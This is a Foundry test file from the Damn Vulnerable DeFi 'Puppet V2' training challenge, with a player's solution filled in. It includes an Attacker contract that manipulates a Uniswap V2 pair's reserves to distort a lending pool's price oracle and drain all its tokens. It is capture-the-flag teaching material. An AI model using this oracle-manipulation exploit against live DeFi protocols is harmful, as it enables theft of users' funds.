// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {IUniswapV2Pair} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import {IUniswapV2Factory} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol";
import {IUniswapV2Router02} from "@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol";
import {WETH} from "solmate/tokens/WETH.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {PuppetV2Pool} from "../../src/puppet-v2/PuppetV2Pool.sol";

contract PuppetV2Challenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");

    uint256 constant UNISWAP_INITIAL_TOKEN_RESERVE = 100e18;
    uint256 constant UNISWAP_INITIAL_WETH_RESERVE = 10e18;
    uint256 constant PLAYER_INITIAL_TOKEN_BALANCE = 10_000e18;
    uint256 constant PLAYER_INITIAL_ETH_BALANCE = 20e18;
    uint256 constant POOL_INITIAL_TOKEN_BALANCE = 1_000_000e18;

    WETH weth;
    DamnValuableToken token;
    IUniswapV2Factory uniswapV2Factory;
    IUniswapV2Router02 uniswapV2Router;
    IUniswapV2Pair uniswapV2Exchange;
    PuppetV2Pool lendingPool;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);
        vm.deal(player, PLAYER_INITIAL_ETH_BALANCE);

        // Deploy tokens to be traded
        token = new DamnValuableToken();
        weth = new WETH();

        // Deploy Uniswap V2 Factory and Router
        uniswapV2Factory = IUniswapV2Factory(
            deployCode(string.concat(vm.projectRoot(), "/builds/uniswap/UniswapV2Factory.json"), abi.encode(address(0)))
        );
        uniswapV2Router = IUniswapV2Router02(
            deployCode(
                string.concat(vm.projectRoot(), "/builds/uniswap/UniswapV2Router02.json"),
                abi.encode(address(uniswapV2Factory), address(weth))
            )
        );

        // Create Uniswap pair against WETH and add liquidity
        token.approve(address(uniswapV2Router), UNISWAP_INITIAL_TOKEN_RESERVE);
        uniswapV2Router.addLiquidityETH{value: UNISWAP_INITIAL_WETH_RESERVE}({
            token: address(token),
            amountTokenDesired: UNISWAP_INITIAL_TOKEN_RESERVE,
            amountTokenMin: 0,
            amountETHMin: 0,
            to: deployer,
            deadline: block.timestamp * 2
        });
        uniswapV2Exchange = IUniswapV2Pair(uniswapV2Factory.getPair(address(token), address(weth)));

        // Deploy the lending pool
        lendingPool =
            new PuppetV2Pool(address(weth), address(token), address(uniswapV2Exchange), address(uniswapV2Factory));

        // Setup initial token balances of pool and player accounts
        token.transfer(player, PLAYER_INITIAL_TOKEN_BALANCE);
        token.transfer(address(lendingPool), POOL_INITIAL_TOKEN_BALANCE);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        assertEq(player.balance, PLAYER_INITIAL_ETH_BALANCE);
        assertEq(token.balanceOf(player), PLAYER_INITIAL_TOKEN_BALANCE);
        assertEq(token.balanceOf(address(lendingPool)), POOL_INITIAL_TOKEN_BALANCE);
        assertGt(uniswapV2Exchange.balanceOf(deployer), 0);

        // Check pool's been correctly setup
        assertEq(lendingPool.calculateDepositOfWETHRequired(1 ether), 0.3 ether);
        assertEq(lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE), 300000 ether);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */

    /**
     * POC: swap 2 times, the first time to make the ratio of the pool 1:1,
     * then it will be easier to make the ratio weth/token so small then we just need a small amount of weth to borrow all the token in the pool
     */
    function test_puppetV2() public checkSolvedByPlayer {
        Attacker attacker = new Attacker{value: address(player).balance}(
            payable(address(weth)),
            address(token),
            address(lendingPool),
            address(uniswapV2Exchange),
            address(uniswapV2Router),
            recovery
        );
        token.transfer(address(attacker), token.balanceOf(player));
        attacker.attack();
        console.log("Attacker's ETH balance:", address(attacker).balance);
        console.log("Attacker's token balance:", token.balanceOf(address(attacker)));
        uint256 reserve0;
        uint256 reserve1;
        (reserve0, reserve1,) = uniswapV2Exchange.getReserves();
        console.log("Pair's reserve0:", reserve0);
        console.log("Pair's reserve1:", reserve1);
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        assertEq(token.balanceOf(address(lendingPool)), 0, "Lending pool still has tokens");
        assertEq(token.balanceOf(recovery), POOL_INITIAL_TOKEN_BALANCE, "Not enough tokens in recovery account");
    }
}

contract Attacker {
    WETH internal _weth;
    DamnValuableToken internal _token;
    PuppetV2Pool internal _lendingPool;
    IUniswapV2Pair internal _uniswapV2Exchange;
    IUniswapV2Router02 internal _uniswapV2Router;
    address internal _recovery;

    constructor(
        address payable weth,
        address token,
        address lendingPool,
        address uniswapV2Exchange,
        address uniswapV2Router,
        address recovery
    ) payable {
        _weth = WETH(weth);
        _token = DamnValuableToken(token);
        _lendingPool = PuppetV2Pool(lendingPool);
        _uniswapV2Exchange = IUniswapV2Pair(uniswapV2Exchange);
        _uniswapV2Router = IUniswapV2Router02(uniswapV2Router);
        _recovery = recovery;
    }

    function attack() external {
        address[] memory path = new address[](2);
        path[0] = address(_weth);
        path[1] = address(_token);
        _uniswapV2Router.swapExactETHForTokens{value: address(this).balance}(
            1, path, address(this), block.timestamp * 2
        );
        path[0] = address(_token);
        path[1] = address(_weth);
        _token.approve(address(_uniswapV2Router), _token.balanceOf(address(this)));
        _uniswapV2Router.swapExactTokensForETH(
            _token.balanceOf(address(this)), 1, path, address(this), block.timestamp * 2
        );

        _weth.deposit{value: address(this).balance}();
        _weth.approve(address(_lendingPool), _weth.balanceOf(address(this)));
        _lendingPool.borrow(_token.balanceOf(address(_lendingPool)));
        _token.transfer(_recovery, _token.balanceOf(address(this)));
    }

    receive() external payable {}
}
